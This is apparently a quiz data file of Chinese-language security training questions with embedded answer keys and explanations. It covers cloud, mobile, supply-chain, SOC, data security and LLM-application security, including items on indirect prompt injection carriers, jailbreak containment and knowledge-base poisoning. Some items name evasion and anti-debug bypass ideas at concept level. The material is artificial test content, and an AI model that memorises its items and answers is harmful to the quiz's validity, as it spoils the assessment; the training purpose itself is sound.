  { id:"dx2", cat:"datasec", level:"高级", q:"令牌映射表的最大风险是？", options:["成为「一把万能钥匙」，一旦泄露所有令牌都可还原","占用存储空间","查询速度慢","格式不统一"], answer:0, explain:"因此映射表需独立加密、最小访问、全量审计，并考虑高可用与隔离。" },
  { id:"sy1", cat:"supply", level:"中级", q:"依赖变化监控中，值得警惕的异常是？", options:["私有包名忽然出现在公共仓库（可能被抢注）","包体积变小","文档更新","作者增加了测试"], answer:0, explain:"公共仓库出现同名包是抢注与投毒的典型信号，需立即核查与阻断。" },
  { id:"sy2", cat:"supply", level:"中级", q:"把依赖变化接入 CI 的价值是？", options:["版本异常变化可被自动拦截，避免污染进入构建","提升构建速度","减少镜像体积","降低测试成本"], answer:0, explain:"门禁能在引入环节阻断风险，比事后排查成本低得多。" },
  { id:"ay1", cat:"aisec", level:"中级", q:"AI 应用审计日志至少应记录？", options:["请求者身份、模型与版本、工具调用与结果、是否触发人工确认","只有回答内容","只有耗时","只有费用"], answer:0, explain:"缺少身份与动作记录无法复盘；同时注意脱敏与留存期限。" },
  { id:"ay2", cat:"aisec", level:"中级", q:"下列哪个信号适合作为 AI 应用的异常告警？", options:["工具调用被拒次数突增或输出敏感信息被护栏拦截","模型响应变快","用户数量增加","缓存命中率上升"], answer:0, explain:"这类信号往往意味着有人在试探边界或数据正在外泄，值得立即关注。" },
  { id:"tz1", cat:"soccti", level:"中级", q:"情报驱动检测优先级的正确做法是？", options:["按行业与资产相关性筛选情报，再转化为待验证的检测假设","把所有 IOC 全部导入设备","只订阅数量最多的情报源","等出事再查情报"], answer:0, explain:"相关性与可执行性决定情报价值，转化为假设后需用演练或狩猎验证。" },
  { id:"tz2", cat:"soccti", level:"中级", q:"评估情报是否真正产生价值，应看？", options:["它转化成了多少条生效规则与多少起真实发现","订阅源数量","报告篇幅","下载次数"], answer:0, explain:"情报价值体现在落地与验证，而非收集与归档。" },

  // ---- 补题（v1.5.1 第八批：把题量拉平到每知识点 ≥3）----
  { id:"nz1", cat:"network", level:"入门", q:"明文协议（HTTP/Telnet/FTP）在链路上传输时，同网段攻击者可以？", options:["直接读取内容与凭据","只能看到包的数量","无法获取任何信息","只能看到目标 IP"], answer:0, explain:"明文协议不做保护，抓包即可读取内容；应改用加密协议。" },
  { id:"nz2", cat:"network", level:"初级", q:"端口扫描中最能反映「服务真实身份」的信息是？", options:["服务与版本指纹（banner/协议特征）","端口号本身","扫描耗时","目标 IP 归属地"], answer:0, explain:"端口号可随意更改，服务与版本指纹才是判断资产与漏洞面的依据。" },
  { id:"nz3", cat:"network", level:"中级", q:"ARP 欺骗在内网之所以容易实施，根本原因是？", options:["ARP 协议本身不认证，任何人都能应答","交换机性能不足","IP 地址池太小","缺少 DNS 服务器"], answer:0, explain:"无认证的地址解析是设计缺陷，需靠接入层防护（DHCP Snooping + DAI）弥补。" },
  { id:"nz4", cat:"network", level:"高级", q:"Kerberos 预认证的作用是？", options:["要求客户端先证明身份再获取票据，避免被离线爆破","加密全部内网流量","防止横向移动","限制登录时段"], answer:0, explain:"关闭预认证会暴露 AS-REP 供离线爆破，因此必须保持开启。" },
  { id:"nz5", cat:"network", level:"中级", q:"绕过基于内容的检测时，攻击者常用的思路是？", options:["让载荷在单包内无法被识别（分片、编码、等价语法）","加密后发送明文","提高发送频率","使用更大带宽"], answer:0, explain:"检测方需做规范化与重组，否则特征匹配会失效。" },
  { id:"nz6", cat:"network", level:"入门", q:"路由器与交换机的主要分工是？", options:["路由器做跨网段转发，交换机做同网段转发","两者完全等价","交换机负责加密","路由器负责端口安全"], answer:0, explain:"理解二层与三层分工是排查网络问题与理解隔离效果的基础。" },
  { id:"nz7", cat:"network", level:"初级", q:"抓包时发现大量重传与握手失败，通常说明？", options:["链路质量或设备策略存在问题（丢包/被拦截）","流量已加密","应用存在注入漏洞","域名解析错误"], answer:0, explain:"重传与握手失败是链路与策略问题的信号，也可能是阻断设备在起作用。" },
  { id:"nz8", cat:"network", level:"中级", q:"判断「某主机是否在扫描全网段」，最有价值的日志是？", options:["该主机的连接/拒绝日志短时间内覆盖大量目标","DNS 查询日志","CPU 使用率","磁盘写入量"], answer:0, explain:"扫描的特征是「一对多」的连接尝试，网络设备与主机的连接日志最能反映。" },
  { id:"nz9", cat:"network", level:"高级", q:"零信任网络与传统边界防护的核心差异是？", options:["不因「在内网」就信任，每次访问都校验身份与设备状态","完全不使用防火墙","只依赖口令认证","取消所有网络分区"], answer:0, explain:"零信任把信任从「位置」改为「持续校验」，更适合远程与多云场景。" },
  { id:"cz1", cat:"cloud", level:"入门", q:"云上「安全责任共担」中，客户始终负责的是？", options:["自己的数据、配置与访问权限","物理机房安全","虚拟化层实现","云厂商的硬件固件"], answer:0, explain:"无论哪种服务模型，数据与配置的责任都在客户侧，这也是云上问题的集中区。" },
  { id:"cz2", cat:"cloud", level:"初级", q:"云上使用角色（Role）而非长期密钥的核心好处是？", options:["权限可精细限定且凭据可自动轮换过期","配置更少","速度更快","费用更低"], answer:0, explain:"临时凭据显著缩短泄露后的可用窗口，并便于按最小权限设计。" },
  { id:"cz3", cat:"cloud", level:"高级", q:"容器与宿主机共享内核带来的安全含义是？", options:["内核漏洞可直接导致逃逸，隔离强度低于虚拟机","容器无法运行","容器更省资源所以更安全","无需加固内核"], answer:0, explain:"因此需要及时打补丁、限制特权与危险挂载，并使用安全运行时。" },
  { id:"cz4", cat:"cloud", level:"高级", q:"Kubernetes 中「自动挂载服务账号令牌」的风险是？", options:["Pod 内可获取集群 API 凭据，被攻陷后可能直接操作集群","增加启动时间","占用内存","影响网络性能"], answer:0, explain:"不需要访问 API 的 Pod 应禁用自动挂载，并按需最小授权。" },
  { id:"cz5", cat:"cloud", level:"中级", q:"Serverless 函数被投毒依赖利用后，攻击者继承的是？", options:["函数的执行角色权限，可调用该角色被允许的云资源","宿主机 root 权限","其他租户的数据","云厂商的管理权限"], answer:0, explain:"因此函数角色必须最小化，并限制其可访问的资源范围。" },
  { id:"cz6", cat:"cloud", level:"中级", q:"云元数据服务（IMDS）的主要风险是？", options:["可被 SSRF 或误配读取，泄露实例临时凭据","导致实例重启","降低网络性能","影响磁盘 IO"], answer:0, explain:"强制 IMDSv2 并限制跳数可显著抬高利用门槛。" },
  { id:"cz7", cat:"cloud", level:"入门", q:"云上排查「谁把桶设成公开」时，最直接的依据是？", options:["对象存储的访问策略与操作审计日志","实例的 CPU 曲线","网络带宽图","镜像构建记录"], answer:0, explain:"策略变更与操作审计能定位「谁在什么时候改了什么」。" },
  { id:"cz8", cat:"cloud", level:"中级", q:"云上「配置漂移」指的是？", options:["实际运行配置偏离了既定基线（多因手工临时修改）","磁盘碎片增多","网络延迟波动","镜像体积变大"], answer:0, explain:"配置漂移会让基线失效，需用配置扫描与基础设施即代码收敛。" },
  { id:"cz9", cat:"cloud", level:"高级", q:"多云环境下做统一事件响应时，最需要先打通的是？", options:["各云的审计日志与资产清单（统一时间线与责任人）","各云的计费系统","各云的界面风格","各云的实例规格"], answer:0, explain:"没有统一的日志与资产视图，跨云事件无法快速界定范围与定责。" },
  { id:"bz9", cat:"blue", level:"入门", q:"SIEM 与「单纯的日志存储」的关键差别是？", options:["SIEM 提供关联分析与告警，而不只是保存日志","SIEM 容量更大","SIEM 更便宜","SIEM 不需要日志源"], answer:0, explain:"关联与告警才是检测价值的来源，纯存储只是数据湖。" },
  { id:"bz10", cat:"blue", level:"中级", q:"基于异常的 IDS 相比基于特征的 IDS，主要特点是？", options:["能发现偏离基线的未知行为，但误报通常更高","完全不会误报","不需要基线数据","只能检测已知攻击"], answer:0, explain:"异常检测覆盖未知威胁，但需要精细的基线与管理误报。" },
  { id:"bz11", cat:"blue", level:"中级", q:"分析 C2 心跳时，「jitter（抖动）」指的是？", options:["心跳间隔的随机扰动，用于规避固定周期检测","数据包大小","加密算法","端口号范围"], answer:0, explain:"加入抖动会让「固定间隔」这一特征失效，检测需转向统计学特征。" },
  { id:"bz12", cat:"blue", level:"高级", q:"勒索事件中「恢复验证」为什么必须在隔离环境做？", options:["防止备份中潜藏的恶意代码或后门再次污染生产环境","为了节省时间","因为生产环境容量不足","便于生成报告"], answer:0, explain:"未验证的备份可能已被污染，隔离验证是恢复前的必要关卡。" },
  { id:"bz13", cat:"blue", level:"初级", q:"威胁情报中「IOA」更关注什么？", options:["攻击行为与手法特征（如何做）","文件哈希（是什么）","域名注册信息","IP 归属地"], answer:0, explain:"IOA 描述行为模式，比静态指标更难被规避。" },
  { id:"bz14", cat:"blue", level:"初级", q:"EDR 的「遥测」通常包含？", options:["进程创建、命令行、网络连接、文件与注册表操作等行为数据","只有病毒库版本","只有登录时间","只有磁盘剩余空间"], answer:0, explain:"丰富的遥测是行为检测与溯源的基础。" },
  { id:"bz15", cat:"blue", level:"中级", q:"把「变更系统」接入安全运营的价值是？", options:["区分「计划内变更」与「异常行为」，显著降低误报","加快网络速度","减少日志量","提升设备寿命"], answer:0, explain:"多数告警噪音来自合法变更，上下文对齐是降噪的关键。" },
  { id:"bz16", cat:"blue", level:"中级", q:"处置剧本里「升级条件」的作用是？", options:["明确何时必须通知更高层级并启动应急，避免延误","记录处理人姓名","统计工作量","计算成本"], answer:0, explain:"升级条件把「什么时候该叫人」变成明确规则，减少主观犹豫。" },
  { id:"bz17", cat:"blue", level:"高级", q:"狩猎假设的来源通常包括？", options:["ATT&CK 技术、最新情报与本次事件复盘结论","员工的直觉","设备厂商建议","随机挑选"], answer:0, explain:"假设要有依据：对手手法、情报指向或既有事件的未解疑点。" },
  { id:"mz1", cat:"mobile", level:"入门", q:"移动安全评估通常从哪三条线同时展开？", options:["客户端、本地数据与通信/接口","界面、性能与兼容性","安装、卸载与升级","广告、推送与统计"], answer:0, explain:"三条线互相印证，单看一条容易漏掉跨层组合风险。" },
  { id:"mz2", cat:"mobile", level:"初级", q:"重打包后应用无法覆盖安装在原应用上，原因是？", options:["签名不同，系统拒绝对不同签名的应用执行覆盖升级","包名变了","版本号变了","缺少权限声明"], answer:0, explain:"签名是升级链路的信任基础，改包必然破坏这条链路。" },
  { id:"mz3", cat:"mobile", level:"初级", q:"用 adb 拉取应用私有目录数据通常需要什么前提？", options:["设备 root 或应用为 debuggable","安装 Burp 证书","开启飞行模式","应用处于前台"], answer:0, explain:"私有目录受系统保护，需 root 或可调试应用才能直接读取。" },
  { id:"mz4", cat:"mobile", level:"中级", q:"WebView 加载的 URL 若来自深链接参数，主要风险是？", options:["URL 可控可导致加载攻击者页面并调用 JS 桥","页面加载变慢","字体显示异常","无法返回上一页"], answer:0, explain:"不可信的 URL 会把手里的原生能力交给外部页面，必须严格白名单校验。" },
  { id:"mz5", cat:"mobile", level:"入门", q:"检查应用是否把敏感信息写入日志，最直接的方式是？", options:["用 logcat 过滤 token/password 等关键字","查看应用图标","测量启动耗时","检查安装包大小"], answer:0, explain:"日志是常见的敏感信息泄露渠道，上线前应做关键字审查。" },
  { id:"mz6", cat:"mobile", level:"初级", q:"证书固定被绕过在报告中的正确表述是？", options:["客户端防护可被绕过，真正防线应在服务端鉴权与风控","说明服务端不安全","建议取消 HTTPS","必须改用私有协议"], answer:0, explain:"客户端防护提高成本但不构成保证，结论要指向服务端与风控设计。" },
  { id:"mz7", cat:"mobile", level:"中级", q:"应用被反调试卡住时，分析者的常见处理是？", options:["定位检测函数并 hook 返回假值或直接绕过检测分支","重装系统","放弃动态分析","换一台手机即可绕过"], answer:0, explain:"反调试本质是提高成本，定位检测点后 hook 或 patch 是标准做法。" },
  { id:"mz8", cat:"mobile", level:"中级", q:"Magisk 隐藏（DenyList/Zygisk）能绕过部分 Root 检测，但仍可能被什么发现？", options:["云端完整性校验（如 Play Integrity）","本地日志","路由器日志","应用商店评论"], answer:0, explain:"完整性校验上移到云端后，本地隐藏不足以通过验证。" },
  { id:"mz9", cat:"mobile", level:"高级", q:"抽取式壳的脱壳时机是？", options:["壳完成解密、真实代码进入内存之后","应用安装时","下载安装包时","应用卸载时"], answer:0, explain:"只有在内存中代码已解密才能 dump，并需要修复 dex 结构。" },
  { id:"mz10", cat:"mobile", level:"初级", q:"iOS 的 ATS（App Transport Security）放宽配置带来的风险是？", options:["可能允许明文 HTTP 通信，导致数据可被窃听","应用无法联网","证书校验加强","性能下降"], answer:0, explain:"ATS 例外会削弱传输安全，评估时应重点核查例外范围与必要性。" },
  { id:"mz11", cat:"mobile", level:"中级", q:"越狱检测被绕过后的评估重点应是？", options:["绕过之后攻击者能获取哪些数据与能力（Keychain、内存、hook）","检测代码行数","检测用了哪些 API","绕过的速度"], answer:0, explain:"结论要落到真实影响面，而不是停留在「能绕过」本身。" },
  { id:"mz12", cat:"mobile", level:"中级", q:"移动接口最常见的两类问题是？", options:["对象级越权与缺乏频率限制","不支持 JSON","不使用 HTTPS","不返回状态码"], answer:0, explain:"越权与限流缺失是移动接口最典型的高危问题。" },
  { id:"mz13", cat:"mobile", level:"高级", q:"静态提取移动恶意样本 IOC 时，优先关注？", options:["硬编码的域名/URL 与可疑权限组合","应用图标配色","安装包体积","签名算法"], answer:0, explain:"域名与权限组合能快速指向 C2 与恶意行为，是 IOC 提取的重点。" },
  { id:"mz14", cat:"mobile", level:"入门", q:"APK 配置清单中 exported=true 的组件意味着？", options:["可被其它应用调用，需要校验权限或调用方","仅调试可见","必须系统签名","应用启动后才生效"], answer:0, explain:"导出组件是对外入口，缺少校验即可被越权调用。" },
  { id:"mz15", cat:"mobile", level:"入门", q:"看到一个手电筒应用申请「读取短信」权限，合理判断是？", options:["权限与功能不匹配，存在过度收集嫌疑","属于正常需求","说明应用功能强大","说明系统版本过低"], answer:0, explain:"权限与功能不匹配是过度收集与恶意行为的典型信号。" },
  { id:"mz16", cat:"mobile", level:"高级", q:"移动逆向的核心产出应该是？", options:["关键逻辑的可复现绕过证据与服务端补强建议","一份混淆后的源码","新的绕过脚本","加固方案"], answer:0, explain:"逆向服务于风险判定与修复，最终要指向服务端加固。" },
  { id:"mz17", cat:"mobile", level:"中级", q:"MDM 的「远程擦除企业数据」与「擦除整机」的关键区别是？", options:["前者只清企业数据容器，不影响员工个人数据","前者速度更快","后者无法执行","两者完全相同"], answer:0, explain:"区分企业数据与个人数据是 MDM 可被员工接受的前提。" },

  // ---- 补齐题量（v1.5.1 第九批：达成每知识点 ≥3 题）----
  { id:"dt1", cat:"datasec", level:"入门", q:"数据分类分级后，控制措施应当？", options:["与等级绑定（等级越高，加密/审批/审计越严）","所有等级一视同仁","只做文档记录即可","只对机密级做任何处理"], answer:0, explain:"分级的意义就是让投入与风险匹配；否则分级只是纸面工作。" },
  { id:"dt2", cat:"datasec", level:"初级", q:"分类分级规则上线后，最需要持续关注的是？", options:["识别准确率与漏报（如备注字段里混入手机号）","规则条数","界面美观度","编写规则的人数"], answer:0, explain:"漏报会让敏感数据逃过分级，需要抽样验证并迭代规则。" },
  { id:"dt3", cat:"datasec", level:"中级", q:"DLP 观察期的主要产出是？", options:["真实的敏感数据流向与误报统计，用于制定收策略","拦截数量","审计报告页数","员工排名"], answer:0, explain:"先看清现状再收紧，否则会引发业务绕过。" },
  { id:"dt4", cat:"datasec", level:"初级", q:"脱敏后仍保留「后四位」的做法，适用于？", options:["业务需要核对但不需要完整值的场景（如客服核验）","需要完整还原的场景","公开披露场景","所有场景"], answer:0, explain:"保留少量片段兼顾可用性与降低暴露，但仍属个人信息需受控。" },
  { id:"dt5", cat:"datasec", level:"中级", q:"密钥轮换的主要目的是？", options:["限制密钥泄露后的影响窗口，并满足合规要求","提升加解密速度","减小密钥体积","减少备份数量"], answer:0, explain:"轮换要能不停机（新旧并存过渡），否则业务会抗拒执行。" },
  { id:"dt6", cat:"datasec", level:"初级", q:"分析「有权限但从不使用」的授权，价值在于？", options:["识别并回收冗余权限，缩小潜在影响面","提升查询速度","减少日志量","节省存储"], answer:0, explain:"权限只增不减会形成隐性高权限，是数据泄露的放大器。" },
  { id:"dt7", cat:"datasec", level:"中级", q:"审计日志自身也需要保护，原因是？", options:["攻击者常优先篡改或删除日志以掩盖痕迹","日志体积太大","日志影响性能","日志格式不统一"], answer:0, explain:"集中收集、只追加与完整性校验是审计可信的前提。" },
  { id:"dt8", cat:"datasec", level:"入门", q:"合规上「单独同意」通常适用于哪些场景？", options:["处理敏感个人信息或向第三方提供个人信息","记录访问日志","系统性能监控","内部代码评审"], answer:0, explain:"这些场景危害更高，需要单独告知并取得明确同意。" },
  { id:"dt9", cat:"datasec", level:"初级", q:"判断某个字段是否属于「最小必要」采集，关键看？", options:["该字段是否为实现已声明功能所必需","字段名是否常见","字段长度","存储成本"], answer:0, explain:"无关字段一律不采，是最省成本的隐私保护方式。" },
  { id:"dt10", cat:"datasec", level:"高级", q:"数据出境合规中，「本地化」为什么常被优先考虑？", options:["能直接规避跨境传输的合规与风险，实现成本可能更低","技术上更先进","性能更好","更便宜"], answer:0, explain:"能不出境就不出境，是风险最低的路径；确实要出境再选评估/合同/认证。" },
  { id:"dt11", cat:"datasec", level:"高级", q:"泄露事件对外通报时最需要避免的是？", options:["在通报中再次暴露不必要的个人信息（二次泄露）","说明已采取的措施","提供咨询通道","说明影响范围"], answer:0, explain:"通报内容要控制细节颗粒度，避免二次伤害与可被利用的信息。" },
  { id:"dt12", cat:"datasec", level:"中级", q:"对高敏数据的访问做「双人复核」的意义是？", options:["用流程约束抑制单人作恶与误操作","提升访问速度","减少日志量","降低存储成本"], answer:0, explain:"技术手段之外，流程制衡是内部威胁防护的重要一环。" },
  { id:"dt13", cat:"datasec", level:"高级", q:"备份系统自身成为攻击目标的原因是？", options:["拿到备份权限即可删除或加密所有副本，破坏恢复能力","备份数据量最大","备份耗时长","备份设备便宜"], answer:0, explain:"因此备份账号要与生产隔离，并保留不可变或离线副本。" },
  { id:"dt14", cat:"datasec", level:"入门", q:"「匿名化」与「假名化」的关键区别是？", options:["匿名化不可还原，假名化借助映射仍可还原","匿名化更便宜","假名化不需要加密","两者完全相同"], answer:0, explain:"假名化数据仍属个人信息受保护，匿名化则在满足条件后不再属于个人信息。" },
  { id:"dt15", cat:"datasec", level:"入门", q:"发现共享链接无口令且已被访问过，下一步应？", options:["核查访问记录判断是否已被异常获取，并按需通报","只改文件内容","删除记录","无需处理"], answer:0, explain:"先收紧再核查影响，必要时按泄露流程处理。" },
  { id:"dt16", cat:"datasec", level:"中级", q:"数据网关若成为单点，应该？", options:["做高可用与旁路只读副本，并监控其自身的安全事件","取消网关直接连库","降低脱敏强度","关闭审计"], answer:0, explain:"收敛入口带来管理与风险集中，必须同步解决可用性与自身安全。" },
  { id:"dt17", cat:"datasec", level:"高级", q:"令牌化方案中最需要严格保护的是？", options:["令牌与原值的映射表（泄露即可还原全部数据）","令牌长度","令牌生成速度","令牌数量"], answer:0, explain:"映射表是令牌化体系的信任根，需独立加密、最小访问、全量审计。" },
  { id:"sv1", cat:"supply", level:"入门", q:"供应链攻击「一次得手、多点生效」的原因是？", options:["被污染的组件或更新通道会被大量下游复用","攻击者数量多","网络带宽大","用户不更新系统"], answer:0, explain:"复用性带来放大效应，这也是供应链攻击效率高的原因。" },
  { id:"sv2", cat:"supply", level:"初级", q:"SBOM 与制品绑定的意义是？", options:["确保清单对应的是这个具体产物，而不是笼统的项目","便于压缩体积","减少构建时间","降低扫描成本"], answer:0, explain:"清单与产物脱钩会导致「查到的组件不是实际运行的组件」。" },
  { id:"sv3", cat:"supply", level:"初级", q:"依赖漏洞治理中「临时缓解」适用于？", options:["短期内无法升级时的补偿措施（如加 WAF 规则或关闭功能）","替代所有升级","永久方案","不需要评估"], answer:0, explain:"缓解只是过渡，仍需在期限内完成升级或替换。" },
  { id:"sv4", cat:"supply", level:"中级", q:"SCA 扫描结果里最需要人工判定的是？", options:["漏洞是否可达（是否真的调用了受影响代码）","漏洞编号长短","扫描耗时","依赖包体积"], answer:0, explain:"可达性判定决定修复优先级，纯按数量排序会浪费大量精力。" },
  { id:"sv5", cat:"supply", level:"中级", q:"禁止安装脚本（如 npm 的 ignore-scripts）能降低什么风险？", options:["依赖安装时执行恶意代码的风险","下载速度慢的风险","版本冲突风险","许可证风险"], answer:0, explain:"安装期执行是投毒常见手段，禁用后需评估对构建的影响。" },
  { id:"sv6", cat:"supply", level:"高级", q:"构建环境「一次性」的意义是？", options:["每次构建从干净环境开始，避免残留污染被带入产物","节省成本","加快构建","减少日志"], answer:0, explain:"持久化构建机容易被植入后门或缓存投毒，污染会被固化进产物。" },
  { id:"sv7", cat:"supply", level:"高级", q:"制品签名验证失败的正确处理是？", options:["拒绝部署并排查（可能是篡改或签名流程问题）","忽略警告继续部署","仅记录日志","重新生成签名"], answer:0, explain:"验签失败意味着完整性存疑，必须先查清原因。" },
  { id:"sv8", cat:"supply", level:"中级", q:"CI/CD 中被外部输入触发的任务，最需要注意？", options:["外部输入不得参与脚本拼接执行，只能作为数据传入","任务运行时间","日志格式","构建产物大小"], answer:0, explain:"表达式注入是流水线常被忽视的高危点，需避免拼接执行。" },
  { id:"sv9", cat:"supply", level:"初级", q:"密钥扫描为什么要放在提交前和 CI 两道？", options:["本地拦截减少泄露概率，CI 兜底防止绕过或漏检","为了统计数量","为了提升构建速度","为了减少仓库体积"], answer:0, explain:"两道拦截互补，任一环节都可能被绕过或误判。" },
  { id:"sv10", cat:"supply", level:"中级", q:"评估开源组件维护状态时，最需要看的指标是？", options:["近期提交与发版频率、issue 响应情况、是否有弃维护声明","Star 数","代码行数","文档语言"], answer:0, explain:"维护状态决定漏洞能否被修复，是引入决策的关键依据。" },
  { id:"sv11", cat:"supply", level:"初级", q:"供应商安全事件通报时限写进合同的意义是？", options:["保证我方能在可控时间内启动应急与告知下游","便于考核供应商","减少沟通成本","满足审计形式要求"], answer:0, explain:"通报时限直接决定你能不能及时止损与履行自身合规义务。" },
  { id:"sv12", cat:"supply", level:"入门", q:"Log4Shell 事件中最缺的能力是什么？", options:["快速判定「哪些系统用了这个组件」的依赖台账能力","更强的防火墙","更多的运维人员","更高的带宽"], answer:0, explain:"没有台账就只能在恐慌中逐个排查，时间成本极高。" },
  { id:"sv13", cat:"supply", level:"高级", q:"供应链事件中「止血」与「判定」为什么要并行？", options:["判定耗时长，先做低风险阻断（如加规则）能争取时间并降低影响","为了减少工作量","因为流程要求","便于汇报"], answer:0, explain:"两面并行才能在信息不全时既控制影响又不中断判定。" },
  { id:"sv14", cat:"supply", level:"入门", q:"「软件供应链」的组成不包括？", options:["办公区绿植与照明","开源依赖库","构建工具与流水线","制品仓库与分发通道"], answer:0, explain:"供应链指构成与分发软件的组件与链路，与办公设施无关。" },
  { id:"sv15", cat:"supply", level:"入门", q:"开源组件引入评审中，询问「是否有健康替代品」的目的是？", options:["为将来替换或弃维护做准备，降低长期风险","为了砍价","为了减少代码量","为了统一技术栈"], answer:0, explain:"替代方案是应对弃维护与高危漏洞的退路，应提前评估。" },
  { id:"sv16", cat:"supply", level:"中级", q:"镜像准入控制通常部署在哪一层？", options:["集群的准入控制器（部署前校验签名与漏洞策略）","开发者的本地机器","代码仓库","邮件网关"], answer:0, explain:"准入控制在部署环节强制策略，能把不可信制品挡在生产之外。" },
  { id:"sv17", cat:"supply", level:"中级", q:"依赖变化告警中「同一包短时间频繁发版」为何值得警惕？", options:["可能是攻击者在试错或恶意版本反复调整","说明维护者勤快","说明社区活跃","说明兼容性好"], answer:0, explain:"异常发版节奏是投毒与账号被盗的常见信号，需结合来源与内容核对。" },
  { id:"aix1", cat:"aisec", level:"入门", q:"LLM 应用安全评估的三个主要层次是？", options:["输入、数据（上下文/知识库）、动作（工具调用）","前端、后端、数据库","开发、测试、生产","网络、主机、应用"], answer:0, explain:"三层分别对应提示注入、数据泄露与越权动作，覆盖了 LLM 的主要风险面。" },
  { id:"aix2", cat:"aisec", level:"初级", q:"间接提示注入最常出现的载体是？", options:["模型会读取的外部内容（文档、网页、邮件、工单）","用户直接输入的问题","系统提示词本身","模型权重文件"], answer:0, explain:"外部内容对模型可读即可写，因此是注入的主要入口。" },
  { id:"aix3", cat:"aisec", level:"中级", q:"越狱防护中，「限制后果」比「阻止绕过」更重要的原因是？", options:["绕过难以彻底阻止，但可以通过权限与确认限制最坏结果","限制后果更省事","阻止绕过不可能","限制后果更便宜"], answer:0, explain:"把风险控制落在不可逆动作上，是更现实的防护思路。" },
  { id:"aix4", cat:"aisec", level:"中级", q:"防止多租户数据串用的关键控制点是？", options:["检索与权限过滤由系统强制注入，不受模型或用户输入影响","提示词里写明不允许","只允许内网访问","关闭流式输出"], answer:0, explain:"安全边界必须由代码强制，提示词不能作为隔离手段。" },
  { id:"aix5", cat:"aisec", level:"中级", q:"知识库投毒的防御重点在？", options:["入库审核与写入权限控制，以及检索结果的降权处理","提升检索速度","增大向量维度","增加存储"], answer:0, explain:"先管住「谁能写进去」，再把检索内容当作数据而非指令。" },
  { id:"aix6", cat:"aisec", level:"高级", q:"Agent 工具分级中，属于「破坏型」的是？", options:["删除数据、支付、修改权限","查询文档","读取日志","生成报告"], answer:0, explain:"破坏型动作不可逆，必须人工确认甚至双人复核。" },
  { id:"aix7", cat:"aisec", level:"初级", q:"把模型输出写入数据库时最需要防止的是？", options:["注入类风险（拼接执行导致的 SQL/命令注入）","字段长度超限","编码不一致","字符集问题"], answer:0, explain:"模型输出等同不可信输入，必须参数化与校验。" },
  { id:"aix8", cat:"aisec", level:"高级", q:"模型文件反序列化执行代码的风险来自哪种格式？", options:["pickle 类可执行反序列化格式","safetensors 等仅数据格式","JSON 配置文件","纯文本权重清单"], answer:0, explain:"优先使用仅数据格式，避免加载即执行。" },
  { id:"aix9", cat:"aisec", level:"初级", q:"把真实业务数据发给外部模型前，最稳妥的做法是？", options:["先脱敏或用占位符替代，并确认供应商不留存不训练","直接发送以求效果","只发一部分即可","只要加密传输就没问题"], answer:0, explain:"数据一旦发出就不再受你控制，源头最小化最有效。" },
  { id:"aix10", cat:"aisec", level:"中级", q:"四层护栏中「能力收敛」指的是？", options:["限制模型可调用的工具与其权限范围","限制用户提问长度","限制输出字数","限制并发请求数"], answer:0, explain:"能力收敛直接决定一次被绕过能造成多大影响。" },
  { id:"aix11", cat:"aisec", level:"高级", q:"红队评估中，「影响判定」为什么比「漏洞数量」更重要？", options:["决定修复优先级与资源投入，避免把精力花在无实际影响的问题上","便于统计","因为客户要求","因为报告需要"], answer:0, explain:"安全评估服务于风险管理，影响面决定优先级。" },
  { id:"aix12", cat:"aisec", level:"中级", q:"LLM 应用的成本型 DoS 最直接的防护是？", options:["入口限长限频并对 Agent 循环设轮次上限","提高模型参数","增加服务器","减少日志"], answer:0, explain:"限制单次与单位时间的资源消耗，是控制成本风险的基本手段。" },
  { id:"aix13", cat:"aisec", level:"入门", q:"AI 治理中，为什么提示词变更要走评审？", options:["它等价于生产配置，改动可能改变安全边界与合规行为","为了流程合规好看","为了记录工作量","为了限制开发速度"], answer:0, explain:"提示词影响模型行为与工具调用，必须像代码一样受控。" },
  { id:"aix14", cat:"aisec", level:"入门", q:"了解「token 与上下文窗口」对安全的实际意义是？", options:["理解上下文长度限制与截断风险，以及注入内容如何进入上下文","为了调参优化效果","为了节省费用","为了选择模型"], answer:0, explain:"上下文是攻击者的目标区域，理解其机制才能设计隔离与限长策略。" },
  { id:"aix15", cat:"aisec", level:"入门", q:"企业使用 AI 时，首先要明确的策略是？", options:["哪些数据可以用哪个模型（数据分级与模型白名单）","使用哪个界面主题","用多少个模型","由谁购买账号"], answer:0, explain:"先划清数据与模型的可用边界，再谈功能与效率。" },
  { id:"aix16", cat:"aisec", level:"中级", q:"把提示词与安全职责分离的判断标准是？", options:["删掉提示词后系统是否仍然安全","提示词是否够长","是否用了英文","是否包含示例"], answer:0, explain:"安全必须由代码层保证，提示词只承担体验与风格。" },
  { id:"aix17", cat:"aisec", level:"中级", q:"AI 应用审计中，工具调用记录至少要包含？", options:["工具名、参数、执行结果与是否经人工确认","只有调用时间","只有工具名","只有耗时"], answer:0, explain:"参数与确认记录决定了能否复盘「模型建议什么、最终执行什么」。" },
  { id:"st1", cat:"soccti", level:"入门", q:"给安全团队用的「运营情报」主要解决？", options:["日常值班重点与专项排查方向","预算审批","设备采购","组织架构调整"], answer:0, explain:"不同层级情报服务不同决策，错配会导致「情报没人用」。" },
  { id:"st2", cat:"soccti", level:"初级", q:"IOC 生命周期的最后一步是？", options:["到期失效与下架（避免长期误伤）","持续封禁","提高优先级","转成 TTP"], answer:0, explain:"共享 IP 与域名会易主，长期保留旧 IOC 会造成误伤。" },
  { id:"st3", cat:"soccti", level:"初级", q:"SOC 值夜班时最重要的支撑是？", options:["清晰的升级路径与可联系上的人","更多仪表盘","更快的机器","更多告警源"], answer:0, explain:"夜间资源少，升级路径是否顺畅直接决定响应时效。" },
  { id:"st4", cat:"soccti", level:"中级", q:"检测规则「可维护」的含义包括？", options:["有测试样本、误报说明与负责人，能随环境演进更新","规则语法正确","规则条数多","规则写在文档里"], answer:0, explain:"没有测试与责任人的规则会逐渐腐化，最终无人敢动。" },
  { id:"st5", cat:"soccti", level:"中级", q:"研判时判断「已知良性行为」的主要依据是？", options:["变更记录、扫描器/备份等工具行为清单","告警等级","来源 IP 归属地","处理人经验"], answer:0, explain:"对齐合法行为白名单是最有效的降噪手段。" },
  { id:"st6", cat:"soccti", level:"高级", q:"狩猎时选择切入点应优先考虑？", options:["高价值风险（凭据滥用、横向移动、持久化）与数据可得性","最容易查的技术","最新的技术","随机选"], answer:0, explain:"优先覆盖影响大且能验证的风险，收益最高。" },
  { id:"st7", cat:"soccti", level:"中级", q:"应急响应中「根除」阶段的验证要点是？", options:["确认入口与所有持久化后门均已清除，而非仅删除恶意文件","重启服务器","更换密码","通知领导"], answer:0, explain:"根除不彻底会导致攻击者利用残留后门重新进入。" },
